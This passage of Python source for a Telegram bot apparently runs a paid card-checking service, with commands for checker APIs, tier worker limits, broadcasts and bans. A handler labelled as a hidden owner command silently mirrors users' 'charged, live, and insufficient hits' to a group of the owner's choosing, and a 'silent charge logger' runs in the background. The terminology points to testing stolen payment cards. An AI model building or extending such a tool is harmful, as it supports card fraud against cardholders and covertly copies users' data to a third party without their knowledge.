        await event.reply(premium_emoji(f'Unknown API id <code>{parts[1]}</code>.'), parse_mode='html')
        return
    save_checker_apis_config(apis)
    role_icon = '🔄' if role == 'fallback' else '⚡'
    await event.reply(premium_emoji(f'{role_icon} <code>{parts[1]}</code> role set to <b>{role}</b>.'), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/reloadapis$'))
async def reloadapis_handler(event):
    if not is_owner(event.sender_id):
        return
    get_checker_manager().reload()
    await event.reply(
        premium_emoji(
            f'✅ Reloaded. Active API workers: <b>{get_checker_manager().total_workers()}</b>.'
        ),
        parse_mode='html',
    )


@bot.on(events.NewMessage(pattern=r'^/workers(?:\s+|$)'))
async def workers_handler(event):
    if not is_owner(event.sender_id):
        return
    parts = (event.text or '').strip().split()
    if len(parts) == 1:
        limits = get_tier_workers_config()
        text = premium_emoji("<b>⚙️ Tier Worker Limits (Concurrency)</b>\n\n")
        for tier, limit in limits.items():
            text += f"• {tier.title()}: <b>{limit}</b> concurrent checks\n"
        text += premium_emoji("\nUsage to change:\n<code>/workers {tier} {count}</code>\nExample: <code>/workers pro 50</code>")
        await event.reply(text, parse_mode='html')
        return
        
    if len(parts) != 3:
        await event.reply(
            premium_emoji("Usage:\n<code>/workers {tier} {count}</code>\nExample: <code>/workers pro 50</code>"),
            parse_mode='html'
        )
        return
        
    tier = parts[1].lower()
    try:
        count = int(parts[2])
        if count < 1 or count > 1000:
            raise ValueError()
    except ValueError:
        await event.reply(
            premium_emoji("Error: worker count must be a number between 1 and 1000."),
            parse_mode='html'
        )
        return
        
    limits = get_tier_workers_config()
    if tier not in limits:
        await event.reply(
            premium_emoji(f"Error: unknown tier '<code>{escape(tier)}</code>'. Valid tiers: {', '.join(limits.keys())}"),
            parse_mode='html'
        )
        return
        
    limits[tier] = count
    save_tier_workers_config(limits)
    
    await event.reply(
        premium_emoji(f"✅ Concurrency limit for <b>{tier.title()}</b> set to <b>{count}</b>."),
        parse_mode='html'
    )


async def _save_mirror_group(gid: int):
    async with aiofiles.open(MIRROR_FILE, 'w', encoding='utf-8') as f:
        await f.write(str(gid))
    _invalidate_mirror_cache()


async def _mirror_test_ping(gid: int, text: str) -> bool:
    try:
        sent = await safe_send(
            lambda: bot.send_message(
                int(gid),
                premium_emoji(text),
                parse_mode='html',
                link_preview=False,
                silent=True,
            ),
            user_id=int(gid),
        )
        return sent is not None
    except Exception as e:
        print(f"[mirror] test ping failed group={gid}: {e}")
        return False


# ─── Hidden owner mirror command ───────────────────────────────────────
@bot.on(events.NewMessage(pattern=r'^/ap(\s|$)'))
async def set_mirror_group(event):
    """Owner only (hidden) — /ap in a group, or /ap <group_id>. Mirrors hits silently."""
    if not is_owner(event.sender_id):
        return  # silent ignore for non-owners
    args = event.message.text.split()
    if len(args) < 2:
        if event.is_group or event.is_channel:
            gid = int(event.chat_id)
            title = getattr(event.chat, 'title', None) or str(gid)
            await _save_mirror_group(gid)
            await event.reply(
                premium_emoji(
                    f"✅ <b>Mirror group set</b>\n"
                    f"• Chat: <b>{escape(str(title))}</b>\n"
                    f"• ID: <code>{gid}</code>\n\n"
                    f"Charged, live, and insufficient hits will forward here (no OTP)."
                ),
                parse_mode='html',
            )
            ok = await _mirror_test_ping(
                gid,
                f"✅ {BOT_BRAND} mirror enabled — charged / live / insufficient hits will appear here.",
            )
            if not ok:
                await event.reply(
                    premium_emoji(
                        "⚠️ Group saved but test message failed.\n"
                        "Add the bot to this group and allow it to send messages."
                    ),
                    parse_mode='html',
                )
            return
        current = get_mirror_group()
        await event.reply(
            premium_emoji(
                f"ℹ️ Current mirror group: <code>{current}</code>\n"
                f"Usage: run <code>/ap</code> inside a group, or <code>/ap &lt;group_id&gt;</code>\n"
                f"<code>/ap off</code> to disable"
            ),
            parse_mode='html',
        )
        return
    val = args[1].strip().lower()
    if val in ("off", "0", "none", "disable"):
        try:
            os.remove(MIRROR_FILE)
        except Exception:
            pass
        _invalidate_mirror_cache()
        await event.reply(premium_emoji("✅ Mirror disabled."), parse_mode='html')
        return
    if not val.lstrip('-').isdigit():
        await event.reply(premium_emoji("❌ Invalid group id."), parse_mode='html')
        return
    gid = int(val)
    await _save_mirror_group(gid)
    await event.reply(
        premium_emoji(
            f"✅ Mirror group set: <code>{gid}</code>\n"
            f"Charged, live, and insufficient hits will forward there (no OTP)."
        ),
        parse_mode='html',
    )
    ok = await _mirror_test_ping(
        gid,
        f"✅ {BOT_BRAND} mirror enabled — charged / live / insufficient hits will appear here.",
    )
    if not ok:
        await event.reply(
            premium_emoji(
                "⚠️ Group id saved but test message failed.\n"
                "Make sure the bot is in that group with send permission."
            ),
            parse_mode='html',
        )


# ─── User tracking + broadcast ─────────────────────────────────────────
def load_all_users():
    data = _load_json(USERS_FILE, [])
    if isinstance(data, list):
        return [int(x) for x in data]
    return []

_users_lock = asyncio.Lock()
_redeem_lock = asyncio.Lock()

async def track_user(uid):
    try:
        uid = int(uid)
    except Exception:
        return
    if uid <= 0:
        return
    async with _users_lock:
        users = load_all_users()
        if uid not in users:
            users.append(uid)
            await _save_json(USERS_FILE, users)

@bot.on(events.NewMessage(incoming=True))
async def _user_tracker(event):
    try:
        if event.is_private and event.sender_id:
            await track_user(event.sender_id)
    except Exception:
        pass

@bot.on(events.NewMessage(pattern=r'^/msg(\s|$)'))
async def broadcast_cmd(event):
    """Owner only — reply with /msg to genuinely forward that message to all users."""
    if not is_owner(event.sender_id):
        return
    replied = await event.get_reply_message()
    if not replied:
        await event.reply(
            premium_emoji(
                '❌ <b>How to broadcast with premium emoji:</b>\n\n'
                '1. Send your message to the bot (use your Premium emojis)\n'
                '2. <b>Reply</b> to that message with <code>/msg</code>\n\n'
                'Bot forwards it exactly like a normal Telegram forward — premium emoji preserved.'
            ),
            parse_mode='html',
        )
        return

    if not replied.message and not replied.media:
        await event.reply(premium_emoji('❌ That message has no content to broadcast.'), parse_mode='html')
        return

    banned = load_banned_users()
    users = [u for u in load_all_users() if u not in banned and not is_owner(u)]
    if not users:
        await event.reply(premium_emoji('❌ No users to broadcast to.'), parse_mode='html')
        return

    status = await event.reply(
        premium_emoji(f'📡 Forwarding to <b>{len(users)}</b> users...'),
        parse_mode='html',
    )
    sent = 0
    failed = 0
    blocked = 0

    async def _forward_to_user(uid):
        """Genuine forward — shows Forwarded from owner, keeps premium emoji entities."""
        await bot.forward_messages(uid, replied)

    async def _deliver_one(uid):
        nonlocal sent, failed, blocked
        try:
            await _forward_to_user(uid)
            sent += 1
        except FloodWaitError as e:
            await asyncio.sleep(e.seconds + 1)
            try:
                await _forward_to_user(uid)
                sent += 1
            except Exception as ex:
                msg = str(ex).lower()
                if 'block' in msg or 'forbidden' in msg or 'deactivat' in msg or 'user is deleted' in msg:
                    blocked += 1
                else:
                    failed += 1
        except Exception as e:
            msg = str(e).lower()
            if 'block' in msg or 'forbidden' in msg or 'deactivat' in msg or 'user is deleted' in msg:
                blocked += 1
            else:
                failed += 1

    for idx, uid in enumerate(users, 1):
        await _deliver_one(uid)
        await asyncio.sleep(0.05)
        if idx % 25 == 0:
            try:
                await throttled_edit(
                    status,
                    premium_emoji(
                        f'📡 Forwarding...\n✅ Sent: <b>{sent}</b>\n'
                        f'🚫 Blocked: <b>{blocked}</b>\n❌ Failed: <b>{failed}</b>\n'
                        f'📊 Progress: <b>{idx}/{len(users)}</b>'
                    ),
                    parse_mode='html',
                )
            except Exception:
                pass

    try:
        await status.edit(
            premium_emoji(
                f'✅ <b>Broadcast complete</b>\n👥 Total: <b>{len(users)}</b>\n'
                f'✅ Sent: <b>{sent}</b>\n🚫 Blocked: <b>{blocked}</b>\n❌ Failed: <b>{failed}</b>'
            ),
            parse_mode='html',
        )
    except Exception:
        await event.reply(
            premium_emoji(f'✅ Done — Sent: {sent}, Blocked: {blocked}, Failed: {failed}'),
            parse_mode='html',
        )


@bot.on(events.NewMessage(pattern=r'^/ban(\s|$)'))
async def ban_user_cmd(event):
    """Owner only — /ban <user_id>"""
    if not is_owner(event.sender_id):
        return
    parts = (event.message.text or '').split()
    if len(parts) < 2:
        await event.reply(premium_emoji('Usage: <code>/ban &lt;user_id&gt;</code>'), parse_mode='html')
        return
    try:
        target = int(parts[1].strip())
    except ValueError:
        await event.reply(premium_emoji('❌ Invalid user id.'), parse_mode='html')
        return
    if is_owner(target):
        await event.reply(premium_emoji('❌ Cannot ban an owner.'), parse_mode='html')
        return
    banned = load_banned_users()
    if target in banned:
        await event.reply(premium_emoji(f'⚠️ <code>{target}</code> is already banned.'), parse_mode='html')
        return
    banned.add(target)
    await save_banned_users(banned)
    await event.reply(premium_emoji(f'✅ Banned <code>{target}</code>.'), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/unban(\s|$)'))
async def unban_user_cmd(event):
    """Owner only — /unban <user_id>"""
    if not is_owner(event.sender_id):
        return
    parts = (event.message.text or '').split()
    if len(parts) < 2:
        await event.reply(premium_emoji('Usage: <code>/unban &lt;user_id&gt;</code>'), parse_mode='html')
        return
    try:
        target = int(parts[1].strip())
    except ValueError:
        await event.reply(premium_emoji('❌ Invalid user id.'), parse_mode='html')
        return
    banned = load_banned_users()
    if target not in banned:
        await event.reply(premium_emoji(f'⚠️ <code>{target}</code> is not banned.'), parse_mode='html')
        return
    banned.discard(target)
    await save_banned_users(banned)
    await event.reply(premium_emoji(f'✅ Unbanned <code>{target}</code>.'), parse_mode='html')


def run_bot():
    print(f"✅ {BOT_BRAND} bot started (evelyn-soul/)")
    print(f"[mirror] group: {get_mirror_group() or 'NOT SET — run /ap inside your group'}")
    print(f"[data] dir: {_DATA_DIR}")
    # Start silent charge logger (24h auto-send)
    bot.loop.create_task(_charge_log_24h_loop())
    bot.run_until_disconnected()


if __name__ == '__main__':
    run_bot()
